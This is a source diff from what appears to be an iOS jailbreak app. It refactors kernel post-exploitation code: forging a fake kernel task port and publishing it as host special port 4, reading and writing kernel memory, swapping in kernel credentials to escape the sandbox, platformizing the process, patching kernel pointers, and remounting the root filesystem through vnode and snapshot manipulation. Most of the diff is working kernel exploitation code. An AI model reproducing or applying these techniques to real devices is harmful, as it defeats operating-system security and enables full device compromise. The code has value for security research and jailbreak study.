@@ -146,300 +146,6 @@ uint64_t find_blr_x19_gadget()
     return blr_x19_addr;
 }
 
-uint32_t IO_BITS_ACTIVE = 0x80000000;
-uint32_t IKOT_TASK = 2;
-uint32_t IKOT_NONE = 0;
-
-void convert_port_to_task_port(mach_port_t port, kptr_t space, kptr_t task_kaddr) {
-    // now make the changes to the port object to make it a task port:
-    auto const port_kaddr = get_address_of_port(getpid(), port);
-    
-    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
-    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
-    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
-    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
-    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
-    
-    // swap our receive right for a send right:
-    auto const task_port_addr = task_self_addr();
-    auto const task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    auto const itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
-    auto const is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
-    
-    auto const port_index = port >> 8;
-    auto const sizeof_ipc_entry_t = 0x18;
-    auto bits = ReadKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
-    
-#define IE_BITS_SEND (1<<16)
-#define IE_BITS_RECEIVE (1<<17)
-    
-    bits &= (~IE_BITS_RECEIVE);
-    bits |= IE_BITS_SEND;
-    
-    WriteKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
-}
-
-void make_port_fake_task_port(mach_port_t port, kptr_t task_kaddr) {
-    convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
-}
-
-kptr_t make_fake_task(kptr_t vm_map) {
-    auto const fake_task_kaddr = kmem_alloc(0x1000);
-    auto const fake_task_size = 0x1000;
-    auto fake_task = malloc(fake_task_size);
-    memset(fake_task, 0, fake_task_size);
-    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
-    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
-    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
-    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
-    kwrite(fake_task_kaddr, fake_task, fake_task_size);
-    SafeFreeNULL(fake_task);
-    return fake_task_kaddr;
-}
-
-void set_all_image_info_addr(kptr_t kernel_task_kaddr) {
-    struct task_dyld_info dyld_info = { 0 };
-    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
-    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
-    LOG("Will save offsets to all_image_info_addr");
-    SETOFFSET(kernel_task_offset_all_image_info_addr, koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_ADDR));
-    if (dyld_info.all_image_info_addr && dyld_info.all_image_info_addr != kernel_base && dyld_info.all_image_info_addr > kernel_base) {
-        auto const blob_size = rk32(dyld_info.all_image_info_addr + offsetof(struct cache_blob, size));
-        auto blob = create_cache_blob(blob_size);
-        _assert(rkbuffer(dyld_info.all_image_info_addr, blob, blob_size), message, true);
-        // Adds any entries that are in kernel but we don't have
-        merge_cache_blob(blob);
-        SafeFreeNULL(blob);
-
-        // Free old offset cache - didn't bother comparing because it's faster to just replace it if it's the same
-        kmem_free(dyld_info.all_image_info_addr, blob_size);
-    }
-    struct cache_blob *cache;
-    size_t cache_size = export_cache_blob(&cache);
-    _assert(cache_size > sizeof(struct cache_blob), message, true);
-    LOG("Setting all_image_info_addr...");
-    kptr_t kernel_cache_blob = kmem_alloc_wired(cache_size);
-    blob_rebase(cache, (kptr_t)cache, kernel_cache_blob);
-    wkbuffer(kernel_cache_blob, cache, cache_size);
-    SafeFreeNULL(cache);
-    WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_ADDR), kernel_cache_blob);
-    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
-    _assert(dyld_info.all_image_info_addr == kernel_cache_blob, message, true);
-}
-
-void set_all_image_info_size(kptr_t kernel_task_kaddr, uint64_t all_image_info_size) {
-    struct task_dyld_info dyld_info = { 0 };
-    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
-    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
-    LOG("Will set all_image_info_size to: " ADDR, all_image_info_size);
-    if (dyld_info.all_image_info_size != all_image_info_size) {
-        LOG("Setting all_image_info_size...");
-        WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_SIZE), all_image_info_size);
-        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
-        _assert(dyld_info.all_image_info_size == all_image_info_size, message, true);
-    } else {
-        LOG("All_image_info_size already set.");
-    }
-}
-
-// Stek29's code.
-
-kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
-void remap_tfp0_set_hsp4(mach_port_t *port) {
-    // huge thanks to Siguza for hsp4 & v0rtex
-    // for explainations and being a good rubber duck :p
-    
-    // see https://github.com/siguza/hsp4 for some background and explaination
-    // tl;dr: there's a pointer comparison in convert_port_to_task_with_exec_token
-    //   which makes it return TASK_NULL when kernel_task is passed
-    //   "simple" vm_remap is enough to overcome this.
-    
-    // However, vm_remap has weird issues with submaps -- it either doesn't remap
-    // or using remapped addresses leads to panics and kittens crying.
-    
-    // tasks fall into zalloc, so src_map is going to be zone_map
-    // zone_map works perfectly fine as out zone -- you can
-    // do remap with src/dst being same and get new address
-    
-    // however, using kernel_map makes more sense
-    // we don't want zalloc to mess with our fake task
-    // and neither
-    
-    // proper way to use vm_* APIs from userland is via mach_vm_*
-    // but those accept task ports, so we're gonna set up
-    // fake task, which has zone_map as its vm_map
-    // then we'll build fake task port from that
-    // and finally pass that port both as src and dst
-    
-    // last step -- wire new kernel task -- always a good idea to wire critical
-    // kernel structures like tasks (or vtables :P )
-    
-    // and we can write our port to realhost.special[4]
-    
-    auto host = mach_host_self();
-    _assert(MACH_PORT_VALID(host), message, true);
-    auto remapped_task_addr = KPTR_NULL;
-    // task is smaller than this but it works so meh
-    auto const sizeof_task = 0x1000;
-    auto const kernel_task_kaddr = ReadKernel64(GETOFFSET(kernel_task));
-    _assert(KERN_POINTER_VALID(kernel_task_kaddr), message, true);
-    LOG("kernel_task_kaddr = " ADDR, kernel_task_kaddr);
-    auto zm_fake_task_port = TASK_NULL;
-    auto km_fake_task_port = TASK_NULL;
-    auto ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
-    ret = ret || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
-    if (ret == KERN_SUCCESS && *port == MACH_PORT_NULL) {
-        _assert(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port) == KERN_SUCCESS, message, true);
-    }
-    auto const zone_map_kptr = GETOFFSET(zone_map_ref);
-    auto const zone_map = ReadKernel64(zone_map_kptr);
-    auto const kernel_map = ReadKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
-    auto const zm_fake_task_kptr = make_fake_task(zone_map);
-    auto const km_fake_task_kptr = make_fake_task(kernel_map);
-    make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
-    make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);
-    km_fake_task_port = zm_fake_task_port;
-    auto cur = VM_PROT_NONE, max = VM_PROT_NONE;
-    _assert(mach_vm_remap(km_fake_task_port, &remapped_task_addr, sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, zm_fake_task_port, kernel_task_kaddr, 0, &cur, &max, VM_INHERIT_NONE) == KERN_SUCCESS, message, true);
-    _assert(kernel_task_kaddr != remapped_task_addr, message, true);
-    LOG("remapped_task_addr = " ADDR, remapped_task_addr);
-    _assert(mach_vm_wire(host, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE) == KERN_SUCCESS, message, true);
-    auto const port_kaddr = get_address_of_port(getpid(), *port);
-    LOG("port_kaddr = " ADDR, port_kaddr);
-    make_port_fake_task_port(*port, remapped_task_addr);
-    _assert(ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) == remapped_task_addr, message, true);
-    auto const host_priv_kaddr = get_address_of_port(getpid(), host);
-    auto const realhost_kaddr = ReadKernel64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    WriteKernel64(realhost_kaddr + koffset(KSTRUCT_OFFSET_HOST_SPECIAL) + 4 * sizeof(kptr_t), port_kaddr);
-    set_all_image_info_addr(kernel_task_kaddr);
-    set_all_image_info_size(kernel_task_kaddr, kernel_slide);
-    mach_port_deallocate(mach_task_self(), host);
-}
-
-void blockDomainWithName(const char *name) {
-    id hostsFile = nil;
-    id newLine = nil;
-    id newHostsFile = nil;
-    hostsFile = [NSString stringWithContentsOfFile:@"/etc/hosts" encoding:NSUTF8StringEncoding error:nil];
-    newHostsFile = hostsFile;
-    newLine = [NSString stringWithFormat:@"\n127.0.0.1 %s\n", name];
-    if (![hostsFile containsString:newLine]) {
-        newHostsFile = [newHostsFile stringByAppendingString:newLine];
-    }
-    newLine = [NSString stringWithFormat:@"\n::1 %s\n", name];
-    if (![hostsFile containsString:newLine]) {
-        newHostsFile = [newHostsFile stringByAppendingString:newLine];
-    }
-    if (![newHostsFile isEqual:hostsFile]) {
-        [newHostsFile writeToFile:@"/etc/hosts" atomically:YES encoding:NSUTF8StringEncoding error:nil];
-    }
-}
-
-void unblockDomainWithName(const char *name) {
-    id hostsFile = nil;
-    id newLine = nil;
-    id newHostsFile = nil;
-    hostsFile = [NSString stringWithContentsOfFile:@"/etc/hosts" encoding:NSUTF8StringEncoding error:nil];
-    newHostsFile = hostsFile;
-    newLine = [NSString stringWithFormat:@"\n127.0.0.1 %s\n", name];
-    if ([hostsFile containsString:newLine]) {
-        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
-    }
-    newLine = [NSString stringWithFormat:@"\n0.0.0.0 %s\n", name];
-    if ([hostsFile containsString:newLine]) {
-        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
-    }
-    newLine = [NSString stringWithFormat:@"\n0.0.0.0    %s\n", name];
-    if ([hostsFile containsString:newLine]) {
-        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
-    }
-    newLine = [NSString stringWithFormat:@"\n::1 %s\n", name];
-    if ([hostsFile containsString:newLine]) {
-        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
-    }
-    if (![newHostsFile isEqual:hostsFile]) {
-        [newHostsFile writeToFile:@"/etc/hosts" atomically:YES encoding:NSUTF8StringEncoding error:nil];
-    }
-}
-
-kptr_t vnodeForPath(const char *path) {
-    auto const vfs_context = vfs_context_current();
-    if (!KERN_POINTER_VALID(vfs_context)) return 0;
-    auto vpp = (kptr_t *)malloc(sizeof(kptr_t));
-    if (vpp == NULL) return 0;
-    bzero(vpp, sizeof(kptr_t));
-    vnode_lookup(path, O_RDONLY, vpp, vfs_context);
-    auto const vnode = *vpp;
-    SafeFreeNULL(vpp);
-    return vnode;
-}
-
-kptr_t vnodeForSnapshot(int fd, char *name) {
-    auto snap_vnode = KPTR_NULL;
-    auto rvpp_ptr = KPTR_NULL;
-    auto sdvpp_ptr = KPTR_NULL;
-    auto ndp_buf = KPTR_NULL;
-    auto sdvpp = KPTR_NULL;
-    auto snap_meta_ptr = KPTR_NULL;
-    auto old_name_ptr = KPTR_NULL;
-    auto ndp_old_name = KPTR_NULL;
-    rvpp_ptr = kmem_alloc(sizeof(kptr_t));
-    if (!KERN_POINTER_VALID(rvpp_ptr)) goto out;
-    sdvpp_ptr = kmem_alloc(sizeof(kptr_t));
-    if (!KERN_POINTER_VALID(sdvpp_ptr)) goto out;
-    ndp_buf = kmem_alloc(816);
-    if (!KERN_POINTER_VALID(ndp_buf)) goto out;
-    auto const vfs_context = vfs_context_current();
-    if (!KERN_POINTER_VALID(vfs_context)) goto out;
-    if (kexecute(GETOFFSET(vnode_get_snapshot), fd, rvpp_ptr, sdvpp_ptr, (kptr_t)name, ndp_buf, 2, vfs_context) != 0) goto out;
-    sdvpp = ReadKernel64(sdvpp_ptr);
-    if (!KERN_POINTER_VALID(sdvpp_ptr)) goto out;
-    auto const sdvpp_v_mount = ReadKernel64(sdvpp + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
-    if (!KERN_POINTER_VALID(sdvpp_v_mount)) goto out;
-    auto const sdvpp_v_mount_mnt_data = ReadKernel64(sdvpp_v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_DATA));
-    if (!KERN_POINTER_VALID(sdvpp_v_mount_mnt_data)) goto out;
-    snap_meta_ptr = kmem_alloc(sizeof(kptr_t));
-    if (!KERN_POINTER_VALID(snap_meta_ptr)) goto out;
-    old_name_ptr = kmem_alloc(sizeof(kptr_t));
-    if (!KERN_POINTER_VALID(old_name_ptr)) goto out;
-    ndp_old_name = ReadKernel64(ndp_buf + 336 + 40);
-    if (!KERN_POINTER_VALID(ndp_old_name)) goto out;
-    auto const ndp_old_name_len = ReadKernel32(ndp_buf + 336 + 48);
-    if (kexecute(GETOFFSET(fs_lookup_snapshot_metadata_by_name_and_return_name), sdvpp_v_mount_mnt_data, ndp_old_name, ndp_old_name_len, snap_meta_ptr, old_name_ptr, 0, 0) != 0) goto out;
-    auto const snap_meta = ReadKernel64(snap_meta_ptr);
-    if (!KERN_POINTER_VALID(snap_meta)) goto out;
-    snap_vnode = kexecute(GETOFFSET(apfs_jhash_getvnode), sdvpp_v_mount_mnt_data, ReadKernel32(sdvpp_v_mount_mnt_data + 440), ReadKernel64(snap_meta + 8), 1, 0, 0, 0);
-    if (snap_vnode != KPTR_NULL) snap_vnode = zm_fix_addr(snap_vnode);
-    if (!KERN_POINTER_VALID(snap_vnode)) goto out;
-out:
-    if (KERN_POINTER_VALID(sdvpp)) vnode_put(sdvpp);
-    if (KERN_POINTER_VALID(sdvpp_ptr)) kmem_free(sdvpp_ptr, sizeof(kptr_t));
-    if (KERN_POINTER_VALID(ndp_buf)) kmem_free(ndp_buf, 816);
-    if (KERN_POINTER_VALID(snap_meta_ptr)) kmem_free(snap_meta_ptr, sizeof(kptr_t));
-    if (KERN_POINTER_VALID(old_name_ptr)) kmem_free(old_name_ptr, sizeof(kptr_t));
-    return snap_vnode;
-}
-
-int waitForFile(const char *filename) {
-    auto rv = access(filename, F_OK);
-    for (auto i = 0; !(i >= 100 || rv == ERR_SUCCESS); i++) {
-        usleep(100000);
-        rv = access(filename, F_OK);
-    }
-    return rv;
-}
-
-NSString *hexFromInt(NSInteger val) {
-    return [NSString stringWithFormat:@"0x%lX", (long)val];
-}
-
-void waitFor(int seconds) {
-    for (auto i = 1; i <= seconds; i++) {
-        LOG("Waiting (%d/%d)", i, seconds);
-        sleep(1);
-    }
-}
-
 void jailbreak()
 {
     auto rv = 0;
@@ -474,21 +180,12 @@ void jailbreak()
         PROGRESS(NSLocalizedString(@"Exploiting kernel...", nil));
         SETMESSAGE(NSLocalizedString(@"Failed to exploit kernel.", nil));
         auto exploit_success = NO;
-        auto persisted_kernel_task_port = TASK_NULL;
-        auto persisted_kernel_base = KPTR_NULL;
-        auto persisted_kernel_slide = KPTR_NULL;
         myHost = mach_host_self();
         _assert(MACH_PORT_VALID(myHost), message, true);
         myOriginalHost = myHost;
-        if (restore_kernel_task_port(&persisted_kernel_task_port) &&
-            restore_kernel_base(persisted_kernel_task_port, &persisted_kernel_base, &persisted_kernel_slide)) {
-            tfp0 = persisted_kernel_task_port;
-            kernel_base = persisted_kernel_base;
-            kernel_slide = persisted_kernel_slide;
-            if (restore_kernel_offset_cache(persisted_kernel_task_port)) {
-                LOG("Restored kernel offset cache.");
-                found_offsets = true;
-            }
+        if (restore_kernel_task_port(&tfp0) &&
+            restore_kernel_base(&kernel_base, &kernel_slide) &&
+            restore_kernel_offset_cache()) {
             usedPersistedKernelTaskPort = YES;
             exploit_success = YES;
         } else {
@@ -622,7 +319,7 @@ void jailbreak()
         offset_options = GETOFFSET(unrestrict-options);
         if (!offset_options) {
             offset_options = kmem_alloc(sizeof(kptr_t));
-            wk64(offset_options, 0);
+            wk64(offset_options, KPTR_NULL);
             SETOFFSET(unrestrict-options, offset_options);
         }
         if (prefs->enable_get_task_allow) {
@@ -717,7 +414,7 @@ void jailbreak()
             LOG("Detected corrupted shenanigans pointer.");
             Shenanigans = kernelCredAddr;
         }
-        WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch);
+        _assert(WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch), message, true);
         myCredAddr = kernelCredAddr;
         myOriginalCredAddr = give_creds_to_process_at_addr(myProcAddr, myCredAddr);
         LOG("myOriginalCredAddr = " ADDR, myOriginalCredAddr);
@@ -728,15 +425,16 @@ void jailbreak()
         _assert(MACH_PORT_VALID(myHost), message, true);
         LOG("Successfully escaped sandbox.");
         LOG("Setting HSP4 as TFP0...");
-        remap_tfp0_set_hsp4(&tfp0);
+        _assert(set_hsp4(tfp0), message, true);
+        _assert(set_all_image_info_addr_and_size(), message, true);
         LOG("Successfully set HSP4 as TFP0.");
         INSERTSTATUS(NSLocalizedString(@"Set HSP4 as TFP0.\n", nil));
         LOG("Initializing kexecute...");
         _assert(init_kexecute(), message, true);
         LOG("Successfully initialized kexecute.");
         LOG("Platformizing...");
-        set_platform_binary(myProcAddr, true);
-        set_cs_platform_binary(myProcAddr, true);
+        _assert(set_platform_binary(myProcAddr, true), message, true);
+        _assert(set_cs_platform_binary(myProcAddr, true), message, true);
         LOG("Successfully initialized jailbreak.");
     }
     
@@ -747,14 +445,14 @@ void jailbreak()
             // Export kernel task port.
             PROGRESS(NSLocalizedString(@"Exporting kernel task port...", nil));
             SETMESSAGE(NSLocalizedString(@"Failed to export kernel task port.", nil));
-            export_tfp0(myOriginalHost);
+            _assert(export_tfp0(myOriginalHost), message, true);
             LOG("Successfully exported kernel task port.");
             INSERTSTATUS(NSLocalizedString(@"Exported kernel task port.\n", nil));
         } else {
             // Unexport kernel task port.
             PROGRESS(NSLocalizedString(@"Unexporting kernel task port...", nil));
             SETMESSAGE(NSLocalizedString(@"Failed to unexport kernel task port.", nil));
-            unexport_tfp0(myOriginalHost);
+            _assert(unexport_tfp0(myOriginalHost), message, true);
             LOG("Successfully unexported kernel task port.");
             INSERTSTATUS(NSLocalizedString(@"Unexported kernel task port.\n", nil));
         }
@@ -923,7 +621,7 @@ void jailbreak()
             
             LOG("Clearing dev vnode's si_flags...");
             SETMESSAGE(NSLocalizedString(@"Failed to clear dev vnode's si_flags.", nil));
-            auto devVnode = vnodeForPath(thedisk);
+            auto devVnode = get_vnode_for_path(thedisk);
             LOG("devVnode = " ADDR, devVnode);
             _assert(KERN_POINTER_VALID(devVnode), message, true);
             auto v_specinfo = ReadKernel64(devVnode + koffset(KSTRUCT_OFFSET_VNODE_VU_SPECINFO));
@@ -989,7 +687,7 @@ void jailbreak()
             auto system_snapshot_vnode_v_data = KPTR_NULL;
             auto system_snapshot_vnode_v_data_flag = 0;
             if (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_12_0) {
-                system_snapshot_vnode = vnodeForSnapshot(rootfd, systemSnapshot);
+                system_snapshot_vnode = get_vnode_for_snapshot(rootfd, systemSnapshot);
                 LOG("system_snapshot_vnode = " ADDR, system_snapshot_vnode);
                 _assert(KERN_POINTER_VALID(system_snapshot_vnode), message, true);
                 system_snapshot_vnode_v_data = ReadKernel64(system_snapshot_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_DATA));
@@ -1029,7 +727,7 @@ void jailbreak()
         }
         
         _assert(runCommand("/sbin/mount", NULL) == ERR_SUCCESS, message, false);
-        auto rootfs_vnode = vnodeForPath("/");
+        auto rootfs_vnode = get_vnode_for_path("/");
         LOG("rootfs_vnode = " ADDR, rootfs_vnode);
         _assert(KERN_POINTER_VALID(rootfs_vnode), message, true);
         auto v_mount = ReadKernel64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
@@ -1138,7 +836,7 @@ void jailbreak()
         CACHEADDR(kernel_slide, "KernelSlide");
         CACHEOFFSET(trustcache, "TrustChain");
         CACHEADDR(ReadKernel64(GETOFFSET(OSBoolean_True)), "OSBooleanTrue");
-        CACHEADDR(ReadKernel64(GETOFFSET(OSBoolean_True)) + sizeof(void *), "OSBooleanFalse");
+        CACHEADDR(ReadKernel64(GETOFFSET(OSBoolean_True)) + sizeof(kptr_t), "OSBooleanFalse");
         CACHEOFFSET(osunserializexml, "OSUnserializeXML");
         CACHEOFFSET(smalloc, "Smalloc");
         CACHEOFFSET(add_x0_x0_0x40_ret, "AddRetGadget");
@@ -1989,8 +1687,8 @@ out:
     LOG("Deinitializing kexecute...");
     term_kexecute();
     LOG("Unplatformizing...");
-    set_platform_binary(myProcAddr, false);
-    set_cs_platform_binary(myProcAddr, false);
+    _assert(set_platform_binary(myProcAddr, false), message, true);
+    _assert(set_cs_platform_binary(myProcAddr, false), message, true);
     LOG("Sandboxing...");
     myCredAddr = myOriginalCredAddr;
     _assert(give_creds_to_process_at_addr(myProcAddr, myCredAddr) == kernelCredAddr, message, true);
@@ -1998,7 +1696,7 @@ out:
     _assert(setuid(myUid) == ERR_SUCCESS, message, true);
     _assert(getuid() == myUid, message, true);
     LOG("Restoring shenanigans pointer...");
-    WriteKernel64(GETOFFSET(shenanigans), Shenanigans);
+    _assert(WriteKernel64(GETOFFSET(shenanigans), Shenanigans), message, true);
     LOG("Deallocating ports...");
     _assert(mach_port_deallocate(mach_task_self(), myHost) == KERN_SUCCESS, message, true);
     myHost = HOST_NULL;
@@ -2030,14 +1728,15 @@ out:
 - (IBAction)tappedOnJailbreak:(id)sender
 {
     STATUS(NSLocalizedString(@"Jailbreak", nil), false, false);
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
+    auto const block = ^(void) {
         _assert(bundledResources != nil, NSLocalizedString(@"Bundled Resources version missing.", nil), true);
         if (!jailbreakSupported()) {
             STATUS(NSLocalizedString(@"Unsupported", nil), false, true);
             return;
         }
         jailbreak();
-    });
+    };
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), block);
 }
 
 - (void)viewWillAppear:(BOOL)animated {
